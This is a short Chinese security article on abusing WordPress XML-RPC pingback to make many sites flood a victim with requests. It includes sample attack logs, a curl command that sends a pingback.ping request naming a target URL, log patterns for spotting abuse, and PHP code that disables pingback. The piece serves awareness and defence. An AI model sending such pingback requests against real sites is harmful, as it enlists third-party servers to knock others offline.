# 超过16W的WordPress网站被用来做DDoS攻击

![enter image description here](http://drops.javaweb.org/uploads/images/8b767b391f09fa78c6f8da9910c1117f3efcd6ca.jpg)

任何开启了Pingback（默认就开启）的WordPress的站点可以被用来做DDOS攻击其它服务器。

看如下日志：

```
74.86.132.186 - - [09/Mar/2014:11:05:27 -0400] "GET /?4137049=6431829 HTTP/1.0" 403 0 "-" "WordPress/3.8; http://www.mtbgearreview.com"
121.127.254.2 - - [09/Mar/2014:11:05:27 -0400] "GET /?4758117=5073922 HTTP/1.0" 403 0 "-" "WordPress/3.4.2; http://www.kschunvmo.com" 
217.160.253.21 - - [09/Mar/2014:11:05:27 -0400] "GET /?7190851=6824134 HTTP/1.0" 403 0 "-" "WordPress/3.8.1; http://www.intoxzone.fr" 
193.197.34.216 - - [09/Mar/2014:11:05:27 -0400] "GET /?3162504=9747583 HTTP/1.0" 403 0 "-" "WordPress/2.9.2; http://www.verwaltungmodern.de" 
..

```

可以发现每次请求还增加了随机数`/?3162504=9747583`以此来绕过缓存。

测试这种攻击方式只需要一个curl命令就可以了：

```
$ curl -D -  "www.anywordpresssite.com/xmlrpc.php" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://victim.com</string></value></param><param><value><string>www.anywordpresssite.com/postchosen</string></value></param></params></methodCall>'

```

想要看你自己的网站是否被用来做了攻击可以查看日志当中是否包含类似如下的内容：

```
93.174.93.72 - - [09/Mar/2014:20:11:34 -0400] "POST /xmlrpc.php HTTP/1.0" 403 4034 "-" "-" "POSTREQUEST:<?xml version=\x221.0\x22 encoding=\x22iso-8859-1\x22?>\x0A<methodCall>\x0A<methodName>pingback.ping</methodName>\x0A<params>\x0A <param>\x0A  <value>\x0A   <string>http://fastbet99.com/?1698491=8940641</string>\x0A  </value>\x0A </param>\x0A <param>\x0A  <value>\x0A   <string>yoursite.com</string>\x0A  </value>\x0A </param>\x0A</params>\x0A</methodCall>\x0A"

94.102.63.238 – - [09/Mar/2014:23:21:01 -0400] "POST /xmlrpc.php HTTP/1.0" 403 4034 "-" "-" "POSTREQUEST:\x0A\x0Apingback.ping\x0A\x0A \x0A \x0A http://www.guttercleanerlondon.co.uk/?7964015=3863899\x0A \x0A \x0A \x0A \x0A yoursite.com\x0A \x0A \x0A\x0A\x0A"

```

防御此问题的推荐方法需要屏蔽 XML-RPC (pingback) 的功能，WordPress主题中添加如下代码：

```
add_filter( 'xmlrpc_methods', function( $methods ) {
   unset( $methods['pingback.ping'] );
   return $methods;
} );
```